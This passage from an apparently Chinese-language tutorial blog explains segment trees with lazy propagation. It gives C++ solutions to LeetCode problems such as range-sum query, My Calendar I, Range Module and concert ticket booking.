root-&gt;left-&gt;lazy = <span class="built_in">min</span>(root-&gt;lazy,root-&gt;left-&gt;lazy);</span><br><span class="line">        root-&gt;right-&gt;lazy = <span class="built_in">min</span>(root-&gt;lazy,root-&gt;right-&gt;lazy);</span><br><span class="line">		</span><br><span class="line">        <span class="comment">//更新子区间最小值</span></span><br><span class="line">        root-&gt;left-&gt;val = <span class="built_in">min</span>(root-&gt;left-&gt;val,root-&gt;lazy);</span><br><span class="line">        root-&gt;right-&gt;val = <span class="built_in">min</span>(root-&gt;right-&gt;val,root-&gt;lazy);</span><br><span class="line"></span><br><span class="line">        root-&gt;lazy = INT_MAX;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(Node *root, <span class="type">int</span> start, <span class="type">int</span> end, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= start &amp;&amp; end &lt;= r) &#123;</span><br><span class="line">            <span class="keyword">return</span> root-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid = start + (end - start) / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">pushDown</span>(root);</span><br><span class="line">        <span class="type">int</span> ans = INT_MAX;</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= mid)</span><br><span class="line">            ans = <span class="built_in">min</span>(ans, <span class="built_in">query</span>(root-&gt;left, start, mid, l, r));</span><br><span class="line">        <span class="keyword">if</span> (r &gt; mid)</span><br><span class="line">            ans = <span class="built_in">min</span>(ans, <span class="built_in">query</span>(root-&gt;right, mid + <span class="number">1</span>, end, l, r));</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>8 题目</h1>
<ul class="lvl-0">
<li class="lvl-4">
<p>对于表示为「<strong>区间和</strong>」且<strong>对区间进行「加减」的更新操作</strong>的情况，我们在更新节点值的时候『需要✖️左右孩子区间叶子节点的数量 (注意是叶子节点的数量)』；我们在下推懒惰标记的时候『需要累加』！！(这种情况和模版一致！！) <strong>如题目 <a href="https://leetcode.cn/problems/number-of-recent-calls/">最近的请求次数</a></strong></p>
</li>
<li class="lvl-4">
<p>对于表示为「<strong>区间和</strong>」且<strong>对区间进行「覆盖」的更新操作</strong>的情况，我们在更新节点值的时候『需要✖️左右孩子区间叶子节点的数量 (注意是叶子节点的数量)』；我们在下推懒惰标记的时候『<strong>不</strong>需要累加』！！(因为是覆盖操作！！) <strong>如题目 <a href="https://leetcode.cn/problems/range-sum-query-mutable/">区域和检索 - 数组可修改</a></strong></p>
</li>
<li class="lvl-4">
<p>对于表示为「<strong>区间最值</strong>」且<strong>对区间进行「加减」的更新操作</strong>的情况，我们在更新节点值的时候『<strong>不</strong>需要✖️左右孩子区间叶子节点的数量 (注意是叶子节点的数量)』；我们在下推懒惰标记的时候『需要累加』！！ <strong>如题目 <a href="https://leetcode.cn/problems/my-calendar-i/">我的日程安排表 I</a>、<a href="https://leetcode.cn/problems/my-calendar-iii/">我的日程安排表 III</a></strong></p>
</li>
</ul>
<h2 id="8-1-固定范围">8.1 固定范围</h2>
<h3 id="8-1-1-307-区域和检索-数组可修改（固定范围，单点更新）">8.1.1 <a href="https://leetcode.cn/problems/range-sum-query-mutable/">307. 区域和检索 - 数组可修改</a>（固定范围，单点更新）</h3>
<h4 id="方法一：链表实现">方法一：链表实现</h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NumArray</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        Node *left,*right;</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">    &#125;;</span><br><span class="line">    Node *root=<span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">NumArray</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">builtTree</span>(root,<span class="number">0</span>,n<span class="number">-1</span>,nums);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">builtTree</span><span class="params">(Node *node,<span class="type">int</span> start,<span class="type">int</span> end,vector&lt;<span class="type">int</span>&gt;&amp; nums)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(start==end)&#123;</span><br><span class="line">            node-&gt;val=nums[start];</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!node-&gt;left) node-&gt;left=<span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">        <span class="keyword">if</span>(!node-&gt;right) node-&gt;right=<span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">        <span class="type">int</span> mid=start+(end-start)/<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">builtTree</span>(node-&gt;left,start,mid,nums);</span><br><span class="line">        <span class="built_in">builtTree</span>(node-&gt;right,mid<span class="number">+1</span>,end,nums);</span><br><span class="line">        node-&gt;val=node-&gt;left-&gt;val+node-&gt;right-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">update</span>(root,<span class="number">0</span>,n<span class="number">-1</span>,index,val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(Node *node,<span class="type">int</span> start,<span class="type">int</span> end, <span class="type">int</span> index,<span class="type">int</span> val)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(start==end)&#123;</span><br><span class="line">            node-&gt;val=val;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> mid=start+(end-start)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(index&lt;=mid)</span><br><span class="line">            <span class="built_in">update</span>(node-&gt;left,start,mid,index,val);</span><br><span class="line">        <span class="keyword">if</span>(index&gt;mid)</span><br><span class="line">            <span class="built_in">update</span>(node-&gt;right,mid<span class="number">+1</span>,end,index,val);</span><br><span class="line">        <span class="comment">// 单点修改后更新节点值</span></span><br><span class="line">        node-&gt;val=node-&gt;left-&gt;val+node-&gt;right-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumRange</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">query</span>(root,<span class="number">0</span>,n<span class="number">-1</span>,left,right);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(Node *node,<span class="type">int</span> start,<span class="type">int</span> end,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=start&amp;&amp;end&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">return</span> node-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid=start+(end-start)/<span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)</span><br><span class="line">            ans+=<span class="built_in">query</span>(node-&gt;left,start,mid,l,r);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)</span><br><span class="line">            ans+=<span class="built_in">query</span>(node-&gt;right,mid<span class="number">+1</span>,end,l,r);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="方法二：数组实现">方法二：数组实现</h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NumArray</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; tree;</span><br><span class="line">    <span class="built_in">NumArray</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n=nums.<span class="built_in">size</span>();</span><br><span class="line">        tree.<span class="built_in">resize</span>(<span class="number">4</span>*n);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">builtTree</span>(<span class="number">0</span>,<span class="number">0</span>,n<span class="number">-1</span>,nums);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// root节点对应的数组下标索引</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">builtTree</span><span class="params">(<span class="type">int</span> root,<span class="type">int</span> left,<span class="type">int</span> right,vector&lt;<span class="type">int</span>&gt;&amp; nums)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left==right)&#123;</span><br><span class="line">            tree[root]=nums[left];</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> mid=left+(right-left)/<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">builtTree</span>(root*<span class="number">2</span><span class="number">+1</span>,left,mid,nums);</span><br><span class="line">        <span class="built_in">builtTree</span>(root*<span class="number">2</span><span class="number">+2</span>,mid<span class="number">+1</span>,right,nums);</span><br><span class="line">        <span class="comment">// 更新</span></span><br><span class="line">        tree[root]=tree[root*<span class="number">2</span><span class="number">+1</span>]+tree[root*<span class="number">2</span><span class="number">+2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">update</span>(<span class="number">0</span>,<span class="number">0</span>,n<span class="number">-1</span>,index,val);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> root,<span class="type">int</span> start,<span class="type">int</span> end,<span class="type">int</span> index,<span class="type">int</span> val)</span></span>&#123;</span><br><span class="line">        <span class="comment">// 当前root索引代表区间[index,index]</span></span><br><span class="line">        <span class="keyword">if</span>(start==end)&#123;</span><br><span class="line">            tree[root]=val;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> mid=start+(end-start)/<span class="number">2</span>;</span><br><span class="line">        <span class="comment">// [index,index]区间在左子树</span></span><br><span class="line">        <span class="keyword">if</span>(index&lt;=mid)</span><br><span class="line">            <span class="built_in">update</span>(root*<span class="number">2</span><span class="number">+1</span>,start,mid,index,val);</span><br><span class="line">        <span class="comment">// 区间位于右子树</span></span><br><span class="line">        <span class="keyword">if</span>(index&gt;mid)</span><br><span class="line">            <span class="built_in">update</span>(root*<span class="number">2</span><span class="number">+2</span>,mid<span class="number">+1</span>,end,index,val);</span><br><span class="line">        <span class="comment">// pushUp</span></span><br><span class="line">        tree[root]=tree[root*<span class="number">2</span><span class="number">+1</span>]+tree[root*<span class="number">2</span><span class="number">+2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumRange</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">query</span>(<span class="number">0</span>,<span class="number">0</span>,n<span class="number">-1</span>,left,right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 当前区间[start,end]，查询区间[l,r]</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> root,<span class="type">int</span> start,<span class="type">int</span> end,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="comment">// 当前区间全部位于查询区间</span></span><br><span class="line">        <span class="keyword">if</span>(l&lt;=start&amp;&amp;end&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">return</span> tree[root];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> mid=start+(end-start)/<span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">// [l,r]与[start,mid]有交集</span></span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)</span><br><span class="line">            ans+=<span class="built_in">query</span>(root*<span class="number">2</span><span class="number">+1</span>,start,mid,l,r);</span><br><span class="line">        <span class="comment">// [l,r]与[mid+1,end]有交集</span></span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)</span><br><span class="line">            ans+=<span class="built_in">query</span>(root*<span class="number">2</span><span class="number">+2</span>,mid<span class="number">+1</span>,end,l,r);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="8-2-不定范围">8.2 不定范围</h2>
<h4 id="729-我的日程安排表-I（动态开点，区间更新）"><a href="https://leetcode.cn/problems/my-calendar-i/">729. 我的日程安排表 I</a>（动态开点，区间更新）</h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyCalendar</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">        Node *left,*right;</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        <span class="type">int</span> add;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> N=<span class="number">1e9</span>;</span><br><span class="line">    Node* root=<span class="keyword">new</span> <span class="built_in">Node</span>(); </span><br><span class="line">    <span class="built_in">MyCalendar</span>() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">book</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">query</span>(root,<span class="number">0</span>,N,start,end<span class="number">-1</span>)!=<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">update</span>(root,<span class="number">0</span>,N,start,end<span class="number">-1</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [l,r]区间+val</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(Node* node,<span class="type">int</span> start,<span class="type">int</span> end,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> val)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=start&amp;&amp;end&lt;=r)&#123;</span><br><span class="line">            node-&gt;val+=(end-start<span class="number">+1</span>)*val;</span><br><span class="line">            node-&gt;add+=val;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当前节点的懒惰标记向下推</span></span><br><span class="line">        <span class="type">int</span> mid=start+(end-start)/<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">pushDown</span>(node,mid-start<span class="number">+1</span>,end-mid);</span><br><span class="line">        <span class="comment">// 分为两个区间：[start,mid] [mid+1,end]</span></span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)</span><br><span class="line">            <span class="built_in">update</span>(node-&gt;left,start,mid,l,r,val);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)</span><br><span class="line">            <span class="built_in">update</span>(node-&gt;right,mid<span class="number">+1</span>,end,l,r,val);</span><br><span class="line">        <span class="built_in">pushUp</span>(node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pushUp</span><span class="params">(Node* node)</span></span>&#123;</span><br><span class="line">        node-&gt;val=node-&gt;left-&gt;val+node-&gt;right-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pushDown</span><span class="params">(Node* node,<span class="type">int</span> leftNum,<span class="type">int</span> rightNum)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!node-&gt;left) node-&gt;left=<span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">        <span class="keyword">if</span>(!node-&gt;right) node-&gt;right=<span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">        <span class="comment">// 如果add为0，则没有标记，不需要下推</span></span><br><span class="line">        <span class="keyword">if</span>(node-&gt;add==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        node-&gt;left-&gt;val+=leftNum*node-&gt;add;</span><br><span class="line">        node-&gt;right-&gt;val+=rightNum*node-&gt;add;</span><br><span class="line"></span><br><span class="line">        node-&gt;left-&gt;add+=node-&gt;add;</span><br><span class="line">        node-&gt;right-&gt;add+=node-&gt;add;</span><br><span class="line"></span><br><span class="line">        node-&gt;add=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询区间未[l,r]，当前区间为[start,end]</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(Node* node,<span class="type">int</span> start,<span class="type">int</span> end,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=start&amp;&amp;end&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">return</span> node-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid=start+(end-start)/<span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">pushDown</span>(node,mid-start<span class="number">+1</span>,end-mid);</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)</span><br><span class="line">            ans+=<span class="built_in">query</span>(node-&gt;left,start,mid,l,r);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)</span><br><span class="line">            ans+=<span class="built_in">query</span>(node-&gt;right,mid<span class="number">+1</span>,end,l,r);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="715-Range-模块"><a href="https://leetcode.cn/problems/range-module/">715. Range 模块</a></h4>
<blockquote>
<p>线段树超时，但是对于track表示范围是否覆盖，lazy定义当前区间操作很有启发意义</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RangeModule</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        Node *left, *right;</span><br><span class="line">        <span class="type">bool</span> track;</span><br><span class="line">        <span class="type">int</span> lazy;           <span class="comment">//1表示跟踪，-1表示排除，0表示无操作</span></span><br><span class="line">    &#125;;</span><br><span class="line">    Node *root;</span><br><span class="line">    <span class="type">int</span> N = <span class="number">1e9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(Node *root, <span class="type">int</span> start, <span class="type">int</span> end, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= start &amp;&amp; end &lt;= r) &#123;</span><br><span class="line">            root-&gt;track = (val==<span class="number">1</span>);</span><br><span class="line">            root-&gt;lazy=val;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid = start + (end - start) / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">pushDown</span>(root);</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= mid)</span><br><span class="line">            <span class="built_in">update</span>(root-&gt;left, start, mid, l, r, val);</span><br><span class="line">        <span class="keyword">if</span> (r &gt; mid)</span><br><span class="line">            <span class="built_in">update</span>(root-&gt;right, mid + <span class="number">1</span>, end, l, r, val);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新root节点表示的区间范围</span></span><br><span class="line">        root-&gt;track = (root-&gt;left-&gt;track &amp;&amp; root-&gt;right-&gt;track);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pushDown</span><span class="params">(Node *root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root-&gt;left)</span><br><span class="line">            root-&gt;left = <span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">        <span class="keyword">if</span> (!root-&gt;right)</span><br><span class="line">            root-&gt;right = <span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(root-&gt;lazy==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        root-&gt;left-&gt;track = (root-&gt;lazy==<span class="number">1</span>);</span><br><span class="line">        root-&gt;right-&gt;track = (root-&gt;lazy==<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        root-&gt;left-&gt;lazy=root-&gt;lazy;</span><br><span class="line">        root-&gt;right-&gt;lazy=root-&gt;lazy;</span><br><span class="line"></span><br><span class="line">        root-&gt;lazy=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">query</span><span class="params">(Node *root, <span class="type">int</span> start, <span class="type">int</span> end, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= start &amp;&amp; end &lt;= r) &#123;</span><br><span class="line">            <span class="keyword">return</span> root-&gt;track;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> mid = start + (end - start) / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">pushDown</span>(root);</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> ans = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= mid)</span><br><span class="line">            ans = (ans &amp;&amp; <span class="built_in">query</span>(root-&gt;left, start, mid, l, r));</span><br><span class="line">        <span class="keyword">if</span> (r &gt; mid)</span><br><span class="line">            ans = (ans &amp;&amp; <span class="built_in">query</span>(root-&gt;right, mid + <span class="number">1</span>, end, l, r));</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RangeModule</span>() &#123; root = <span class="keyword">new</span> <span class="built_in">Node</span>(); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addRange</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">update</span>(root, <span class="number">0</span>, N, left, right<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">queryRange</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">query</span>(root, <span class="number">0</span>, N, left, right<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">removeRange</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">update</span>(root, <span class="number">0</span>, N, left, right<span class="number">-1</span>, <span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="8-3-列表">8.3 列表</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox18" checked="true"><label for="checkbox18">#### </label><a href="https://leetcode.cn/problems/my-calendar-i/">729. 我的日程安排表 I</a>（区间更新，动态开点，维护区间和）</p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox19" checked="true"><label for="checkbox19">#### </label><a href="https://leetcode.cn/problems/my-calendar-ii/">731. 我的日程安排表 II</a>（区间更新，动态开点，维护最大值）</p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox20" checked="true"><label for="checkbox20">#### </label><a href="https://leetcode.cn/problems/my-calendar-iii/">732. 我的日程安排表 III</a>（区间更新，动态开点，维护最大值）</p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox21"><label for="checkbox21">#### </label><a href="https://leetcode.cn/problems/range-module/">715. Range 模块</a></p>
</li>
</ul>
<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p>单点修改</p>
</li>
<li class="lvl-2">
<p>区间查询</p>
</li>
</ul>
</blockquote>
<p><a href="https://www.bilibili.com/video/BV18t4y1p736/?spm_id_from=333.788&amp;vd_source=5427cf02c00273188250be648b53eced">线段树入门【力扣双周赛 79】LeetCode_哔哩哔哩_bilibili</a></p>
<h4 id="2286-以组为单位订音乐会的门票"><a href="https://leetcode.cn/problems/booking-concert-tickets-in-groups/">2286. 以组为单位订音乐会的门票</a></h4>
<blockquote>
<p>数组实现线段树</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BookMyShow</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> n,m;</span><br><span class="line">    vector&lt;<span class="type">long</span>&gt; minPeople,sumPeople;</span><br><span class="line">    <span class="built_in">BookMyShow</span>(<span class="type">int</span> n, <span class="type">int</span> m) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n=n;</span><br><span class="line">        <span class="keyword">this</span>-&gt;m=m;</span><br><span class="line">        minPeople.<span class="built_in">resize</span>(<span class="number">4</span>*n);  <span class="comment">//区间中一排坐的最少人数</span></span><br><span class="line">        sumPeople.<span class="built_in">resize</span>(<span class="number">4</span>*n);  <span class="comment">//区间中坐的总人数</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将idx排的人数增加val</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> o,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> idx,<span class="type">int</span> val)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">            minPeople[o]+=val;</span><br><span class="line">            sumPeople[o]+=val;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 二分</span></span><br><span class="line">        <span class="type">int</span> mid=l+(r-l)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(idx&lt;=mid)</span><br><span class="line">            <span class="built_in">add</span>(<span class="number">2</span>*o<span class="number">+1</span>,l,mid,idx,val);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">add</span>(<span class="number">2</span>*o<span class="number">+2</span>,mid<span class="number">+1</span>,r,idx,val);</span><br><span class="line">        </span><br><span class="line">        minPeople[o]=<span class="built_in">min</span>(minPeople[<span class="number">2</span>*o<span class="number">+1</span>],minPeople[<span class="number">2</span>*o<span class="number">+2</span>]);</span><br><span class="line">        sumPeople[o]=sumPeople[<span class="number">2</span>*o<span class="number">+1</span>]+sumPeople[<span class="number">2</span>*o<span class="number">+2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询[L,R]之间的区间和</span></span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="title">query_sum</span><span class="params">(<span class="type">int</span> o,<span class="type">int</span> left,<span class="type">int</span> right,<span class="type">int</span> L,<span class="type">int</span> R)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(L&lt;=left&amp;&amp;right&lt;=R)</span><br><span class="line">            <span class="keyword">return</span> sumPeople[o];</span><br><span class="line">        <span class="type">int</span> mid=left+(right-left)/<span class="number">2</span>;</span><br><span class="line">        <span class="type">long</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(L&lt;=mid)</span><br><span class="line">            sum+=<span class="built_in">query_sum</span>(<span class="number">2</span>*o<span class="number">+1</span>,left,mid,L,R);</span><br><span class="line">        <span class="keyword">if</span>(R&gt;mid)</span><br><span class="line">            sum+=<span class="built_in">query_sum</span>(<span class="number">2</span>*o<span class="number">+2</span>,mid<span class="number">+1</span>,right,L,R);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回区间[0,R]中&lt;=val的最小下标，不存在返回-1</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">index</span><span class="params">(<span class="type">int</span> o,<span class="type">int</span> left,<span class="type">int</span> right,<span class="type">int</span> R,<span class="type">int</span> val)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(minPeople[o]&gt;val)</span><br><span class="line">            <span 